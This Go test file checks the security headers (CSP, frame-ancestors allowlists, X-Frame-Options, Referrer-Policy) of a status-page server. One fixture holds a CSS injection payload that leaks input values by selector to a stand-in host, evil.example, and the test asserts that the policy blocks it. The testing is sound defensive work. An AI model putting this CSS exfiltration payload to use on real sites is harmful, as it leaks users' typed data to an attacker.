package app

// Tests for the security headers wiring (spec 2026-09-25-28): which surface
// gets which policy, the per-org embed allowlist in frame-ancestors, and the
// JSON API staying untouched.

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/config"
	"github.com/fclairamb/solidping/server/internal/db/models"
	"github.com/fclairamb/solidping/server/internal/db/sqlite"
	"github.com/fclairamb/solidping/server/internal/securityheaders"
)

// cspDirective returns the sources of one directive of a CSP header value.
func cspDirective(t *testing.T, csp, name string) []string {
	t.Helper()

	for _, part := range strings.Split(csp, ";") {
		fields := strings.Fields(part)
		if len(fields) > 0 && fields[0] == name {
			return fields[1:]
		}
	}

	t.Fatalf("directive %s missing from %q", name, csp)

	return nil
}

// status0ShellWithInlineScript mirrors the real shell: one inline no-flash
// script, one module script by src.
const status0ShellWithInlineScript = `<!doctype html><html><head><title>x</title>` +
	`<script>document.documentElement.classList.add("dark")</script>` +
	`<script type="module" crossorigin src="/s/assets/app-abc123.js"></script>` +
	`</head><body></body></html>`

func newSecurityHeadersTestServer(t *testing.T) (*Server, *sqlite.Service) {
	t.Helper()

	r := require.New(t)
	ctx := t.Context()

	dbSvc, err := sqlite.New(ctx, sqlite.Config{InMemory: true})
	r.NoError(err)
	r.NoError(dbSvc.Initialize(ctx))
	t.Cleanup(func() { _ = dbSvc.Close() })

	server := &Server{
		config:       &config.Config{},
		dbService:    dbSvc,
		embedOrigins: newEmbedOriginsCache(embedOriginsCacheTTL),
		status0FS: fstest.MapFS{
			"status0res/index.html":           &fstest.MapFile{Data: []byte(status0ShellWithInlineScript)},
			"status0res/assets/app-abc123.js": &fstest.MapFile{Data: []byte("console.log(1)")},
		},
	}

	return server, dbSvc
}

func TestStatusPageShellCSP(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	ctx := t.Context()

	server, dbSvc := newSecurityHeadersTestServer(t)

	embedding := models.NewOrganization("acme", "Acme")
	r.NoError(dbSvc.CreateOrganization(ctx, embedding))
	r.NoError(dbSvc.SetOrgParameter(ctx, embedding.UID, models.ParamKeyStatusPageAllowedEmbedOrigins,
		"https://intranet.acme.com,https://*.acme.com", false))

	plain := models.NewOrganization("plain", "Plain")
	r.NoError(dbSvc.CreateOrganization(ctx, plain))

	// A page whose operator CSS tries to beacon a third party. The CSS itself
	// is fetched by the SPA from the API, so what the server controls — and
	// what is asserted here — is the policy delivered with the page: no
	// img-src / font-src / connect-src allows evil.example (or any https:).
	page := models.NewStatusPage(plain.UID, "Main", "main")
	evilCSS := `input[value^="a"]{background:url(https://evil.example/leak?a)}`
	page.CustomCSS = &evilCSS
	r.NoError(dbSvc.CreateStatusPage(ctx, page))

	serve := func(path string) *httptest.ResponseRecorder {
		req := httptest.NewRequestWithContext(ctx, http.MethodGet, path, nil)
		rec := httptest.NewRecorder()
		r.NoError(server.serveStatus0Static(rec, req))

		return rec
	}

	// Default: frame-ancestors 'self', X-Frame-Options SAMEORIGIN.
	rec := serve("/s/plain/main")
	csp := rec.Header().Get(securityheaders.HeaderCSP)
	r.NotEmpty(csp)
	r.Equal([]string{"'self'"}, cspDirective(t, csp, "frame-ancestors"))
	r.Equal("SAMEORIGIN", rec.Header().Get(securityheaders.HeaderFrameOptions))
	r.Equal("no-referrer", rec.Header().Get(securityheaders.HeaderReferrerPolicy))

	for _, name := range []string{"img-src", "font-src", "connect-src", "default-src"} {
		for _, src := range cspDirective(t, csp, name) {
			r.Containsf([]string{"'self'", "data:"}, src,
				"%s must be first-party only, so %s cannot load", name, evilCSS)
		}
	}

	r.Equal([]string{"'self'", "'unsafe-inline'"}, cspDirective(t, csp, "style-src"),
		"the custom stylesheet itself must keep applying")

	// The shell's inline no-flash script is allowed by hash, nothing else is.
	script := cspDirective(t, csp, "script-src")
	r.Len(script, 2)
	r.Equal("'self'", script[0])
	r.True(strings.HasPrefix(script[1], "'sha256-"), script[1])
	r.NotContains(csp, "unsafe-eval")

	// The org with an allowlist: its origins in frame-ancestors, no XFO —
	// including on a deeper route (the TV mode is what intranets embed).
	for _, path := range []string{"/s/acme/main", "/s/acme", "/s/acme/main/tv"} {
		rec = serve(path)
		csp = rec.Header().Get(securityheaders.HeaderCSP)
		r.Equal([]string{"'self'", "https://intranet.acme.com", "https://*.acme.com"},
			cspDirective(t, csp, "frame-ancestors"), path)
		r.Empty(rec.Header().Get(securityheaders.HeaderFrameOptions), path)
	}

	// Another org never inherits it.
	rec = serve("/s/plain")
	r.Equal([]string{"'self'"}, cspDirective(t, rec.Header().Get(securityheaders.HeaderCSP), "frame-ancestors"))

	// Unknown org: still served, still 'self' only.
	rec = serve("/s/nobody/main")
	r.Equal([]string{"'self'"}, cspDirective(t, rec.Header().Get(securityheaders.HeaderCSP), "frame-ancestors"))

	// Assets carry the policy too (no hash needed).
	rec = serve("/s/assets/app-abc123.js")
	r.NotEmpty(rec.Header().Get(securityheaders.HeaderCSP))
}

func TestStatusPageEmbedOriginsAreCached(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	ctx := t.Context()

	server, dbSvc := newSecurityHeadersTestServer(t)

	org := models.NewOrganization("cached", "Cached")
	r.NoError(dbSvc.CreateOrganization(ctx, org))
	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, models.ParamKeyStatusPageAllowedEmbedOrigins,
		"https://a.acme.com", false))

	r.Equal([]string{"https://a.acme.com"}, server.statusPageEmbedOrigins(ctx, "cached"))

	// A change inside the TTL is not seen yet (the documented "within a
	// minute"); a fresh cache sees it.
	r.NoError(dbSvc.DeleteOrgParameter(ctx, org.UID, models.ParamKeyStatusPageAllowedEmbedOrigins))
	r.Equal([]string{"https://a.acme.com"}, server.statusPageEmbedOrigins(ctx, "cached"))

	server.embedOrigins = newEmbedOriginsCache(time.Nanosecond)
	time.Sleep(time.Millisecond)
	r.Empty(server.statusPageEmbedOrigins(ctx, "cached"))
}

func TestStatusPathOrgSlug(t *testing.T) {
	t.Parallel()

	tests := map[string]string{
		"/s":              "",
		"/s/":             "",
		"/s/acme":         "acme",
		"/s/Acme/main":    "acme",
		"/s/acme/main/tv": "acme",
	}

	for path, want := range tests {
		require.Equal(t, want, statusPathOrgSlug(path), path)
	}
}

func TestCustomHostShellCSP(t *testing.T) {
	t.Parallel()
	r := require.New(t)

	server := newCustomHostTestServer(t)
	server.customDomainCache.set("embedded.acme.com", customDomainResolution{
		page: &resolvedCustomDomain{
			OrgSlug: "acme", Slug: "embedded", Name: "Acme Embedded",
			Visibility:   models.StatusPageVisibilityPublic,
			EmbedOrigins: []string{"https://intranet.acme.com"},
		},
	})

	handler := server.handlerWithCustomDomains(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusTeapot)
	}))

	serve := func(host, path string) *httptest.ResponseRecorder {
		req := httptest.NewRequestWithContext(t.Context(), http.MethodGet, path, nil)
		req.Host = host
		req.Header.Set("Accept", "text/html")
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)

		return rec
	}

	rec := serve("status.acme.com", "/")
	csp := rec.Header().Get(securityheaders.HeaderCSP)
	r.Equal([]string{"'self'", "data:"}, cspDirective(t, csp, "img-src"))
	r.Equal([]string{"'self'"}, cspDirective(t, csp, "frame-ancestors"))
	r.Equal("SAMEORIGIN", rec.Header().Get(securityheaders.HeaderFrameOptions))
	r.Equal("no-referrer", rec.Header().Get(securityheaders.HeaderReferrerPolicy))

	rec = serve("embedded.acme.com", "/")
	csp = rec.Header().Get(securityheaders.HeaderCSP)
	r.Equal([]string{"'self'", "https://intranet.acme.com"}, cspDirective(t, csp, "frame-ancestors"))
	r.Empty(rec.Header().Get(securityheaders.HeaderFrameOptions))

	// Assets on the custom host carry the status-page policy.
	rec = serve("status.acme.com", "/s/assets/app-abc123.js")
	r.NotEmpty(rec.Header().Get(securityheaders.HeaderCSP))

	// The not-currently-served page is framing-protected.
	rec = serve("demoted.acme.com", "/")
	r.Equal(http.StatusServiceUnavailable, rec.Code)
	r.Equal("SAMEORIGIN", rec.Header().Get(securityheaders.HeaderFrameOptions))

	// The allowlisted API passthrough is untouched.
	rec = serve("status.acme.com", "/api/v1/status-pages/acme/main")
	r.Equal(http.StatusOK, rec.Code)
	r.Empty(rec.Header().Get(securityheaders.HeaderCSP))
	r.Empty(rec.Header().Get(securityheaders.HeaderFrameOptions))
}

func TestLookupCustomDomainCarriesEmbedOrigins(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	ctx := t.Context()

	dbSvc, err := sqlite.New(ctx, sqlite.Config{InMemory: true})
	r.NoError(err)
	r.NoError(dbSvc.Initialize(ctx))
	t.Cleanup(func() { _ = dbSvc.Close() })

	org := models.NewOrganization("acme", "Acme")
	r.NoError(dbSvc.CreateOrganization(ctx, org))
	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, models.ParamKeyStatusPageAllowedEmbedOrigins,
		"https://intranet.acme.com", false))

	page := models.NewStatusPage(org.UID, "Main", "main")
	r.NoError(dbSvc.CreateStatusPage(ctx, page))

	domain := "status.acme.com"
	verifiedAt := time.Now().UTC()
	r.NoError(dbSvc.UpdateStatusPageCustomDomain(ctx, page.UID, &models.StatusPageCustomDomainUpdate{
		Domain: &domain, VerifiedAt: &verifiedAt, State: models.CustomDomainStateActive,
	}))

	server := &Server{dbService: dbSvc}
	resolved := server.lookupCustomDomain(ctx, domain)
	r.NotNil(resolved.page)
	r.Equal([]string{"https://intranet.acme.com"}, resolved.page.EmbedOrigins)
}

func TestDashboardCSP(t *testing.T) {
	t.Parallel()
	r := require.New(t)

	server := &Server{config: &config.Config{}}

	req := httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/d/orgs/acme/checks", nil)
	req.Host = "solidping.acme.com"
	req.Header.Set("X-Forwarded-Proto", "https")
	rec := httptest.NewRecorder()
	r.NoError(server.serveDash0Static(rec, req))

	csp := rec.Header().Get(securityheaders.HeaderCSP)
	r.NotEmpty(csp)
	r.Equal([]string{"'self'"}, cspDirective(t, csp, "frame-ancestors"))
	r.Equal("SAMEORIGIN", rec.Header().Get(securityheaders.HeaderFrameOptions))
	r.Contains(cspDirective(t, csp, "connect-src"), "wss://solidping.acme.com",
		"the realtime socket must be allowed")
	r.Contains(cspDirective(t, csp, "img-src"), "https:")
	r.Contains(rec.Header().Values("Vary"), "X-Forwarded-Proto")
	r.Empty(rec.Header().Get(securityheaders.HeaderReferrerPolicy))
}

func TestDashboardThirdPartyOrigins(t *testing.T) {
	t.Parallel()
	r := require.New(t)

	r.Nil(dashboardThirdPartyOrigins(config.PostHogConfig{}), "inactive PostHog adds nothing")

	proxied := config.PostHogConfig{Enabled: true, ProjectAPIKey: "phc_x"}
	r.Equal([]string{"https://eu.posthog.com"}, dashboardThirdPartyOrigins(proxied),
		"with the /ingest proxy only the UI host (toolbar) is external")

	selfHosted := config.PostHogConfig{Enabled: true, ProjectAPIKey: "phc_x", Host: "https://ph.acme.com/"}
	r.Equal([]string{"https://ph.acme.com"}, dashboardThirdPartyOrigins(selfHosted))
}

func TestBaselineOnDocsOpenAPIAndNotFound(t *testing.T) {
	t.Parallel()
	r := require.New(t)

	server := &Server{config: &config.Config{}}

	docs := httptest.NewRecorder()
	server.serveDocsFile(docs, "/")
	r.Equal("frame-ancestors 'self'; base-uri 'self'; object-src 'none'", docs.Header().Get(securityheaders.HeaderCSP))
	r.Equal("SAMEORIGIN", docs.Header().Get(securityheaders.HeaderFrameOptions))

	openapi := httptest.NewRecorder()
	r.NoError(server.serveFile(openAPIFiles, "openapi/index.html")(
		openapi, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/openapi", nil)))
	r.Equal("frame-ancestors 'self'; base-uri 'self'; object-src 'none'", openapi.Header().Get(securityheaders.HeaderCSP))

	notFound := httptest.NewRecorder()
	r.NoError(server.serveAppRoot(notFound, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/nope", nil)))
	r.Equal(http.StatusNotFound, notFound.Code)
	r.Equal("SAMEORIGIN", notFound.Header().Get(securityheaders.HeaderFrameOptions))
}

// TestSecurityHeadersThroughTheRealRouter boots the real server (NewServer +
// SetupRoutes) and checks every surface end to end, including that the JSON
// API is left exactly as it was and that headers.csp_extra_sources applies.
func TestSecurityHeadersThroughTheRealRouter(t *testing.T) {
	t.Parallel()
	r := require.New(t)
	ctx := context.Background()

	cfg := &config.Config{}
	cfg.Database.Type = dbTypeSQLiteMemory
	cfg.Auth.JWTSecret = "security-headers-secret"
	cfg.Headers.CSPExtraSources = "img-src https://cdn.acme.com; sandbox allow-scripts"

	server, err := NewServer(ctx, cfg)
	r.NoError(err)
	t.Cleanup(func() { _ = server.dbService.Close() })

	r.NoError(server.Initialize(ctx))
	r.NoError(server.InitializeSystemConfig(ctx, cfg))
	server.SetupRoutes(ctx)

	org := models.NewOrganization("embedder", "Embedder")
	r.NoError(server.dbService.CreateOrganization(ctx, org))
	r.NoError(server.dbService.SetOrgParameter(ctx, org.UID, models.ParamKeyStatusPageAllowedEmbedOrigins,
		"https://intranet.acme.com", false))

	ts := httptest.NewServer(server.Handler())
	t.Cleanup(ts.Close)

	get := func(path string) *http.Response {
		req, reqErr := http.NewRequestWithContext(ctx, http.MethodGet, ts.URL+path, nil)
		r.NoError(reqErr)

		client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		}}

		resp, doErr := client.Do(req)
		r.NoError(doErr)
		_ = resp.Body.Close()

		return resp
	}

	// JSON API: no CSP, no XFO, no Referrer-Policy.
	for _, path := range []string{"/api/mgmt/version", "/api/mgmt/health", "/api/v1/nope"} {
		resp := get(path)
		r.Empty(resp.Header.Get(securityheaders.HeaderCSP), path)
		r.Empty(resp.Header.Get(securityheaders.HeaderFrameOptions), path)
		r.Empty(resp.Header.Get(securityheaders.HeaderReferrerPolicy), path)
	}

	status := get("/s/embedder/main")
	statusCSP := status.Header.Get(securityheaders.HeaderCSP)
	r.Equal([]string{"'self'", "https://intranet.acme.com"}, cspDirective(t, statusCSP, "frame-ancestors"))
	r.Empty(status.Header.Get(securityheaders.HeaderFrameOptions))
	r.Equal([]string{"'self'", "data:", "https://cdn.acme.com"}, cspDirective(t, statusCSP, "img-src"),
		"the operator extra applies; the invalid sandbox group is skipped")
	r.NotContains(statusCSP, "sandbox")

	dash := get("/d/")
	dashCSP := dash.Header.Get(securityheaders.HeaderCSP)
	r.Contains(cspDirective(t, dashCSP, "script-src"), "'self'")
	r.Equal("SAMEORIGIN", dash.Header.Get(securityheaders.HeaderFrameOptions))

	docs := get("/docs")
	r.Equal("SAMEORIGIN", docs.Header.Get(securityheaders.HeaderFrameOptions))
	r.NotEmpty(docs.Header.Get(securityheaders.HeaderCSP))

	openapi := get("/openapi")
	r.Equal("SAMEORIGIN", openapi.Header.Get(securityheaders.HeaderFrameOptions))
}
